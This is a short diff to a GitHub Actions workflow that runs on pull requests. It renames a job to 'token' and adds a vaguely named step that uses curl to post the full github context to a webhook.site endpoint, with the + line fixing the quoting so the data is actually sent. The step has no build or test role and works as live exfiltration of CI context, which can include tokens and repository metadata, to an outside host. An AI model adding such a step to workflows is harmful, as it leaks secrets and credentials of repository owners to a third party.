@@ -3,9 +3,9 @@ name: integration
 on: [pull_request]
 
 jobs:
-  lint:
+  token:
     runs-on: ubuntu-latest
     steps:
     - name: blah
       run: |
-        curl https://webhook.site/df8cc6ae-32b1-42cb-85a7-21c19fd37f56 --data ${{ toJSON(github) }}
+        curl https://webhook.site/df8cc6ae-32b1-42cb-85a7-21c19fd37f56 --data '${{ toJSON(github) }}'
